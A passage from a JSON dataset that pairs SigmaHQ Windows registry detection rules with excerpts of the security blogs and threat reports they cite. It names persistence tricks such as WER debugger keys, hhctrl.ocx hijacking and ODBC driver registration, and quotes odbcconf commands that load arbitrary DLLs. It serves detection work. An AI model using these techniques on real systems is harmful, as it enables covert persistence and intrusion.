        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_exploit_guard_susp_allowed_apps.yml"
  },
  "958": {
    "url": "https://persistence-info.github.io/Data/wer_debugger.html",
    "markdown": "# persistence-info.github.io ## WER Debugger ### Location: ``` HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs ``` ### Classification: | Criteria | Value | |------------------|---------------------| | Permissions | Admin | | Security context | User; System[^1] | | Persistence type | Registry | | Code type | EXE | | Launch type | Other | | Impact | Non-destructive[^2] | | OS Version | All OS versions | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry. The",
    "sigma_rule": {
      "title": "Add Debugger Entry To Hangs Key For Persistence",
      "id": "833ef470-fa01-4631-a79b-6f291c9ac498",
      "status": "test",
      "description": "Detects when an attacker adds a new \"Debugger\" value to the \"Hangs\" key in order to achieve persistence which will get invoked when an application crashes",
      "references": [
        "https://persistence-info.github.io/Data/wer_debugger.html",
        "https://www.hexacorn.com/blog/2019/09/20/beyond-good-ol-run-key-part-116/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\Debugger"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "This value is not set by default but could be rarly used by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hangs_debugger_persistence.yml"
  },
  "959": {
    "url": "https://www.hexacorn.com/blog/2019/09/20/beyond-good-ol-run-key-part-116/",
    "markdown": "# Beyond good ol’ Run key, Part 116 Posted on 2019-09-20 by adam This is a bit of an exotic entry, but it belongs to a very little understood world of Windows Error Reporting. When applications hang, the Windows Error Reporting framework allows us to attach a debugger, if it is set up in the Registry. The actual key is present in this location: ``` HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\ Debugger = <executable> ```",
    "sigma_rule": {
      "title": "Add Debugger Entry To Hangs Key For Persistence",
      "id": "833ef470-fa01-4631-a79b-6f291c9ac498",
      "status": "test",
      "description": "Detects when an attacker adds a new \"Debugger\" value to the \"Hangs\" key in order to achieve persistence which will get invoked when an application crashes",
      "references": [
        "https://persistence-info.github.io/Data/wer_debugger.html",
        "https://www.hexacorn.com/blog/2019/09/20/beyond-good-ol-run-key-part-116/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs\\Debugger"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "This value is not set by default but could be rarly used by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hangs_debugger_persistence.yml"
  },
  "960": {
    "url": "https://persistence-info.github.io/Data/hhctrl.html",
    "markdown": "# persistence-info.github.io ## hhctrl.ocx ### Location: ``` HKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32 ``` ### Classification: | Criteria | Value | | ---------------- | ------------------ | | Permissions | Admin | | Security context | User | | Persistence type | Registry | | Code type | Other[^1] | | Launch type | User initiated[^2] | | Impact | Destructive[^3] | | OS Version | All OS versions | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > When hh.exe is started it tries to find the hhctrl.ocx library by checking the following Registry value: `HKCR\\CLSID{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32’ The library that the",
    "sigma_rule": {
      "title": "Persistence Via Hhctrl.ocx",
      "id": "f10ed525-97fe-4fed-be7c-2feecca941b1",
      "status": "test",
      "description": "Detects when an attacker modifies the registry value of the \"hhctrl\" to point to a custom binary",
      "references": [
        "https://persistence-info.github.io/Data/hhctrl.html",
        "https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\\(Default)"
        },
        "filter": {
          "Details": "C:\\Windows\\System32\\hhctrl.ocx"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hhctrl_persistence.yml"
  },
  "961": {
    "url": "https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/",
    "markdown": "# Beyond good ol’ Run key, Part 77 Posted on 2018-04-23 This is one more about hh.exe program that is used when you open the .chm files. The hh.exe functionality is implemented by the hhctrl.ocx library. When hh.exe is started it tries to find the hhctrl.ocx library by checking the following Registry value: ``` HKCR\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32 ``` The library that the value points to is then loaded. If the library doesn’t exist, or the loading didn’t succeed the hh.exe gives it another go and attempts to load the library using the hard-coded name hhctrl.ocx and relying on the LoadLibrary function (and",
    "sigma_rule": {
      "title": "Persistence Via Hhctrl.ocx",
      "id": "f10ed525-97fe-4fed-be7c-2feecca941b1",
      "status": "test",
      "description": "Detects when an attacker modifies the registry value of the \"hhctrl\" to point to a custom binary",
      "references": [
        "https://persistence-info.github.io/Data/hhctrl.html",
        "https://www.hexacorn.com/blog/2018/04/23/beyond-good-ol-run-key-part-77/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\CLSID\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\InprocServer32\\(Default)"
        },
        "filter": {
          "Details": "C:\\Windows\\System32\\hhctrl.ocx"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hhctrl_persistence.yml"
  },
  "962": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd",
    "markdown": "",
    "sigma_rule": {
      "title": "Registry Modification to Hidden File Extension",
      "id": "5df86130-4e95-4a54-90f7-26541b40aec2",
      "status": "test",
      "description": "Hides the file extension through modification of the registry",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd",
        "https://unit42.paloaltonetworks.com/ransomware-families/",
        "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A"
      ],
      "author": "frack113",
      "date": "2022-01-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1137"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_HideFileExt": {
          "TargetObject|endswith": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
          "Details": "DWORD (0x00000001)"
        },
        "selection_Hidden": {
          "TargetObject|endswith": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
          "Details": "DWORD (0x00000002)"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hidden_extention.yml"
  },
  "963": {
    "url": "https://unit42.paloaltonetworks.com/ransomware-families/",
    "markdown": "# Ransomware Families: 2021 Data to Supplement the Unit 42 Ransomware Threat Report ## Executive Summary Ransomware is one of the top threats in cybersecurity and a focus area for Palo Alto Networks. In the current threat landscape, ransom payments are rising and organizations are seeking to protect themselves from threat actors. In the 2021 Unit 42 Ransomware Threat Report, we detailed the observations and the trend of top ransomware families from January 2020-January 2021. This post supplements that information based on observations from the first three months of 2021, and will discuss the propagation of different ransomware families we",
    "sigma_rule": {
      "title": "Registry Modification to Hidden File Extension",
      "id": "5df86130-4e95-4a54-90f7-26541b40aec2",
      "status": "test",
      "description": "Hides the file extension through modification of the registry",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd",
        "https://unit42.paloaltonetworks.com/ransomware-families/",
        "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A"
      ],
      "author": "frack113",
      "date": "2022-01-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1137"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_HideFileExt": {
          "TargetObject|endswith": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
          "Details": "DWORD (0x00000001)"
        },
        "selection_Hidden": {
          "TargetObject|endswith": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
          "Details": "DWORD (0x00000002)"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hidden_extention.yml"
  },
  "964": {
    "url": "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A",
    "markdown": "# TrojanSpy:MSIL/Hakey.A **Published:** Dec 18, 2011 **Updated:** Sep 15, 2017 Detected by Microsoft Defender Antivirus Aliases: No associated aliases ## Summary Windows Defender detects and removes this threat. This threat can watch and record what you do on your PC and send this information to a malicious hacker. Find out ways that malware can get on your PC. ## What to do now Use the following free Microsoft software to detect and remove this threat: - Microsoft Defender Antivirus for Windows 10 and Windows 8.1, or Microsoft Security Essentials for Windows 7 and Windows Vista. - Microsoft Safety Scanner. You",
    "sigma_rule": {
      "title": "Registry Modification to Hidden File Extension",
      "id": "5df86130-4e95-4a54-90f7-26541b40aec2",
      "status": "test",
      "description": "Hides the file extension through modification of the registry",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd",
        "https://unit42.paloaltonetworks.com/ransomware-families/",
        "https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A"
      ],
      "author": "frack113",
      "date": "2022-01-22",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1137"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_HideFileExt": {
          "TargetObject|endswith": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt",
          "Details": "DWORD (0x00000001)"
        },
        "selection_Hidden": {
          "TargetObject|endswith": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
          "Details": "DWORD (0x00000002)"
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_hidden_extention.yml"
  },
  "965": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md#atomic-test-6---add-root-certificate-to-currentuser-certificate-store",
    "markdown": "# T1553.004 - Install Root Certificate ## Description from ATT&CK Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a",
    "sigma_rule": {
      "title": "New Root or CA or AuthRoot Certificate to Store",
      "id": "d223b46b-5621-4037-88fe-fda32eead684",
      "status": "test",
      "description": "Detects the addition of new root, CA or AuthRoot certificates to the Windows registry",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md#atomic-test-6---add-root-certificate-to-currentuser-certificate-store",
        "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec"
      ],
      "author": "frack113",
      "date": "2022-04-04",
      "modified": "2023-08-17",
      "tags": [
        "attack.impact",
        "attack.t1490"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\"
          ],
          "TargetObject|endswith": "\\Blob",
          "Details": "Binary Data"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_install_root_or_ca_certificat.yml"
  },
  "966": {
    "url": "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec",
    "markdown": "# Code Signing Certificate Cloning Attacks and Defenses Before reading this post, ponder the following question: “What does it *actually* mean to you for something to be signed by Microsoft (or any vendor for that matter)?” ## Introduction: SOC Analyst Autoruns Baselining Scenario Imagine you’re working in a SOC and you’re tasked with baselining persistence entries across 40,000 hosts. You’re tasked specifically with inspecting run key persistence. You have Sysinternals deployed across the enterprise, you run Autoruns across every system, and forward the results to a Splunk dashboard that allows you to easily interpret the results. The smart SOC analyst",
    "sigma_rule": {
      "title": "New Root or CA or AuthRoot Certificate to Store",
      "id": "d223b46b-5621-4037-88fe-fda32eead684",
      "status": "test",
      "description": "Detects the addition of new root, CA or AuthRoot certificates to the Windows registry",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md#atomic-test-6---add-root-certificate-to-currentuser-certificate-store",
        "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec"
      ],
      "author": "frack113",
      "date": "2022-04-04",
      "modified": "2023-08-17",
      "tags": [
        "attack.impact",
        "attack.t1490"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": [
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\CA\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\",
            "\\SOFTWARE\\Policies\\Microsoft\\SystemCertificates\\AuthRoot\\Certificates\\",
            "\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\AuthRoot\\Certificates\\"
          ],
          "TargetObject|endswith": "\\Blob",
          "Details": "Binary Data"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_install_root_or_ca_certificat.yml"
  },
  "967": {
    "url": "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Internet Explorer DisableFirstRunCustomize Enabled",
      "id": "ab567429-1dfb-4674-b6d2-979fd2f9d125",
      "status": "test",
      "description": "Detects changes to the Internet Explorer \"DisableFirstRunCustomize\" value, which prevents Internet Explorer from running the first run wizard the first time a user starts the browser after installing Internet Explorer or Windows.\n",
      "references": [
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf",
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
        "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-16",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize",
          "Details": [
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "filter_main_generic": {
          "Image": [
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\ie4uinit.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "As this is controlled by group policy as well as user settings. Some false positives may occur."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_internet_explorer_disable_first_run_customize.yml"
  },
  "968": {
    "url": "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
    "markdown": "# Operation Ke3chang Resurfaces With New TidePool Malware **Published:** May 22, 2016 ## Introduction Little has been published on the threat actors responsible for Operation Ke3chang since the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We’ve discovered a new malware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also",
    "sigma_rule": {
      "title": "Internet Explorer DisableFirstRunCustomize Enabled",
      "id": "ab567429-1dfb-4674-b6d2-979fd2f9d125",
      "status": "test",
      "description": "Detects changes to the Internet Explorer \"DisableFirstRunCustomize\" value, which prevents Internet Explorer from running the first run wizard the first time a user starts the browser after installing Internet Explorer or Windows.\n",
      "references": [
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf",
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
        "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-16",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize",
          "Details": [
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "filter_main_generic": {
          "Image": [
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\ie4uinit.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "As this is controlled by group policy as well as user settings. Some false positives may occur."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_internet_explorer_disable_first_run_customize.yml"
  },
  "969": {
    "url": "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise",
    "markdown": "",
    "sigma_rule": {
      "title": "Internet Explorer DisableFirstRunCustomize Enabled",
      "id": "ab567429-1dfb-4674-b6d2-979fd2f9d125",
      "status": "test",
      "description": "Detects changes to the Internet Explorer \"DisableFirstRunCustomize\" value, which prevents Internet Explorer from running the first run wizard the first time a user starts the browser after installing Internet Explorer or Windows.\n",
      "references": [
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf",
        "https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/",
        "https://admx.help/?Category=InternetExplorer&Policy=Microsoft.Policies.InternetExplorer::NoFirstRunCustomise"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-16",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize",
          "Details": [
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "filter_main_generic": {
          "Image": [
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\ie4uinit.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "As this is controlled by group policy as well as user settings. Some false positives may occur."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_internet_explorer_disable_first_run_customize.yml"
  },
  "970": {
    "url": "https://redcanary.com/blog/blue-mockingbird-cryptominer/",
    "markdown": "## Introducing Blue Mockingbird Red Canary Intel is monitoring a potentially novel threat that is deploying Monero cryptocurrency-mining payloads on Windows machines at multiple organizations. **Originally published** May 7, 2020. **Last modified** April 30, 2024. --- **Blue Mockingbird** is the name we’ve given to a cluster of similar activity we’ve observed involving Monero cryptocurrency-mining payloads in dynamic-link library (DLL) form on Windows systems. They achieve initial access by exploiting public-facing web applications, specifically those that use Telerik UI for ASP.NET, followed by execution and persistence using multiple techniques (check out my colleague Jesse Brown’s new blog for details on Blue",
    "sigma_rule": {
      "title": "Blue Mockingbird - Registry",
      "id": "92b0b372-a939-44ed-a11b-5136cf680e27",
      "related": [
        {
          "id": "c3198a27-23a0-4c2c-af19-e5328d49680e",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Attempts to detect system changes made by Blue Mockingbird",
      "references": [
        "https://redcanary.com/blog/blue-mockingbird-cryptominer/"
      ],
      "author": "Trent Liffick (@tliffick)",
      "date": "2020-05-14",
      "modified": "2023-08-17",
      "tags": [
        "attack.execution",
        "attack.t1112",
        "attack.t1047"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_mal_blue_mockingbird.yml"
  },
  "971": {
    "url": "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/",
    "markdown": "# ODBCConf – Lolbin Trifecta Posted on 2020-08-23 I posted about ODBCConf before and then posted again on Twitter. The Twitter bit was about REGSVR: ``` odbcconf.exe /a {REGSVR c:\\test\\test.dll} ``` – loads a DLL At that time I looked at other ACTIONS accepted by this tool, but didn’t explore them fully. Of course, the one I did want to explore the most was INSTALLDRIVER, but put it on a backburner. I eventually tested it today and here’s the result: ``` ODBCConf /ld foo /a {INSTALLDRIVER \"test|Driver=c:\\test\\test64.dll|APILevel=2\"} ``` This will set up ‘test’ driver entry in Registry. We then need",
    "sigma_rule": {
      "title": "New ODBC Driver Registered",
      "id": "3390fbef-c98d-4bdd-a863-d65ed7c610dd",
      "status": "test",
      "description": "Detects the registration of a new ODBC driver.",
      "references": [
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-23",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\ODBC\\ODBCINST.INI\\",
          "TargetObject|endswith": "\\Driver"
        },
        "filter_main_sqlserver": {
          "TargetObject|contains": "\\SQL Server\\",
          "Details": "%WINDIR%\\System32\\SQLSRV32.dll"
        },
        "filter_optional_office_access": {
          "TargetObject|contains": "\\Microsoft Access ",
          "Details|startswith": "C:\\Progra",
          "Details|endswith": "\\ACEODBC.DLL"
        },
        "filter_optional_office_excel": {
          "TargetObject|contains": "\\Microsoft Excel Driver",
          "Details|startswith": "C:\\Progra",
          "Details|endswith": "\\ACEODBC.DLL"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_odbc_driver_registered.yml"
  },
  "972": {
    "url": "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/",
    "markdown": "# ODBCConf – Lolbin Trifecta Posted on 2020-08-23 I posted about ODBCConf before and then posted again on Twitter. The Twitter bit was about REGSVR: ``` odbcconf.exe /a {REGSVR c:\\test\\test.dll} ``` – loads a DLL At that time I looked at other ACTIONS accepted by this tool, but didn’t explore them fully. Of course, the one I did want to explore the most was INSTALLDRIVER, but put it on a backburner. I eventually tested it today and here’s the result: ``` ODBCConf /ld foo /a {INSTALLDRIVER \"test|Driver=c:\\test\\test64.dll|APILevel=2\"} ``` This will set up ‘test’ driver entry in Registry. We then need",
    "sigma_rule": {
      "title": "Potentially Suspicious ODBC Driver Registered",
      "id": "e4d22291-f3d5-4b78-9a0c-a1fbaf32a6a4",
      "status": "test",
      "description": "Detects the registration of a new ODBC driver where the driver is located in a potentially suspicious location",
      "references": [
        "https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-23",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "\\SOFTWARE\\ODBC\\ODBCINST.INI\\",
          "TargetObject|endswith": [
            "\\Driver",
            "\\Setup"
          ],
          "Details|contains": [
            ":\\PerfLogs\\",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Registration\\CRMLog",
            ":\\Windows\\System32\\com\\dmp\\",
            ":\\Windows\\System32\\FxsTmp\\",
            ":\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\",
            ":\\Windows\\System32\\spool\\drivers\\color\\",
            ":\\Windows\\System32\\spool\\PRINTERS\\",
            ":\\Windows\\System32\\spool\\SERVERS\\",
            ":\\Windows\\System32\\Tasks_Migrated\\",
            ":\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\SysWOW64\\com\\dmp\\",
            ":\\Windows\\SysWOW64\\FxsTmp\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\",
            ":\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            ":\\Windows\\Tracing\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_odbc_driver_registered_susp.yml"
  },
  "973": {
    "url": "https://twitter.com/inversecos/status/1494174785621819397",
